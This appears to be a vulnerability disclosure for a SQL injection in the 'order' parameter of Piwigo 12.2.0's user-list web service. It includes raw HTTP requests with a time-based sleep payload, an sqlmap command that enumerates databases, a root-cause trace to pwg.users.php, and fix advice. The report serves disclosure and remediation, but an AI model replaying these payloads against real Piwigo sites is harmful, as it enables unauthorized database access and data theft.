### Vulnerability details


**vulnerability type:** SQL injection 

**vulnerability versions:** piwigo 12.2.0

**vulnerability Url:** [http://10.92.66.148/piwigo/ws.php?format=json&method=pwg.users.getList](http://10.92.66.148/piwigo/ws.php?format=json&method=pwg.users.getList)

**SQL injected fields exist**：**order**
### verification procedure 


log on to the system and go user-Management-user list 
![image.png](https://cdn.nlark.com/yuque/0/2022/png/496192/1645694349612-48bd1e16-2a86-4765-8660-cd49cbe5da63.png#clientId=u15ad27cc-f5e1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=657&id=u1d142fa1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=657&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88030&status=done&style=none&taskId=u09ce7338-8d20-4cc9-9c9e-b96e87ebb61&title=&width=1920)
Vulnerability Data：
```java
POST /piwigo/ws.php?format=json&method=pwg.users.getList HTTP/1.1
Host: 10.92.66.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 101
Origin: http://10.92.66.148
Connection: close
Referer: http://10.92.66.148/piwigo/admin.php?page=user_list
Cookie: pwg_id=pkl5bk0ifq21ss8nb2j126u55j; pwg_display_thumbnail=no_display_thumbnail; pwg_album_manager_view=tile; pwg_plugin_manager_view=classic; pwg_user_manager_view=line; PHPSESSID=2a8da2cbc685d8412cbf8e64

display=all&order=(select*from(select+sleep(5)union/**/select+1)a)&page=0&per_page=5&exclude%5B%5D=2
```
Modify the exclude[] field and use Sleep(5) to execute SQL statements with a delay of 5 seconds. As shown in the following figure, data is returned with a delay of 5 seconds, proving that SQL injection exists:
![image.png](https://cdn.nlark.com/yuque/0/2022/png/496192/1645695083763-ee8c8fc9-896d-475c-8418-9bfddb38f776.png#clientId=ub56e8d03-d575-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=963&id=u969d1d1f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=963&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=196586&status=done&style=none&taskId=ua7df5d8f-7e92-4847-9b5f-8cc46deac78&title=&width=1920)
Use SQLmap to verify vulnerabilities. Data packets are marked as injection points: 
```java
POST /piwigo/ws.php?format=json&method=pwg.users.getList HTTP/1.1
Host: 10.92.66.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 55
Origin: http://10.92.66.148
Connection: close
Referer: http://10.92.66.148/piwigo/admin.php?page=user_list
Cookie: pwg_id=pkl5bk0ifq21ss8nb2j126u55j; pwg_display_thumbnail=no_display_thumbnail; pwg_album_manager_view=tile; pwg_plugin_manager_view=classic; pwg_user_manager_view=line; PHPSESSID=2a8da2cbc685d8412cbf8e64

display=all&order=*&page=0&per_page=5&exclude%5B%5D=2
```
Execution Parameters 
**py -3 sqlmap.py -r text.txt  --batch --dbs**
![image.png](https://cdn.nlark.com/yuque/0/2022/png/496192/1645694916505-5ebb9e56-d114-432a-841f-90d38407fdcb.png#clientId=ub56e8d03-d575-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=670&id=u1b1c00f0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=1712&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79192&status=done&style=none&taskId=u08c49590-014d-4335-a043-56a830e0d0d&title=&width=1712)
You can see that the database name has been read, so you can Dump sensitive data directly from the database. Furthermore, if the database has DBA privileges, an attacker can take over the server.
​

### Vulnerability analysis


By analyzing the PHP files imported from ws.php and the parameters in the packet, you can trace it back to **pwg.users.php**
![image.png](https://cdn.nlark.com/yuque/0/2022/png/496192/1645696554932-7f0ac51d-45fb-4fdb-8b7e-5c21bfec87b5.png#clientId=u4414a1b4-c4cf-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=847&id=u748295a8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=847&originWidth=1835&originalType=binary&ratio=1&rotation=0&showTitle=false&size=174810&status=done&style=none&taskId=u5e6077ec-ab55-4b40-9207-b691eb9fd3e&title=&width=1835)

pwg.users.php is located in **\include\ws_functions\pwg.users.php**, and the order parameter is inserted into the SQL statement to join the query. And the SQL statement does not verify the validity of the passed parameters, resulting in SQL injection.
![image.png](https://cdn.nlark.com/yuque/0/2022/png/496192/1645696679194-a2ac5790-faef-4260-a87a-cc7f9d7840d9.png#clientId=u4414a1b4-c4cf-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=525&id=u7e91d845&margin=%5Bobject%20Object%5D&name=image.png&originHeight=525&originWidth=1747&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101923&status=done&style=none&taskId=ua6550307-cc5f-4ffb-9512-092256505c3&title=&width=1747)


### Vulnerability Fix
​

1. Precompile SQL statements in query parameters and filter special characters such as single and double quotation marks.
2. Perform a global check on SQL injection to prevent SQL injection.
​

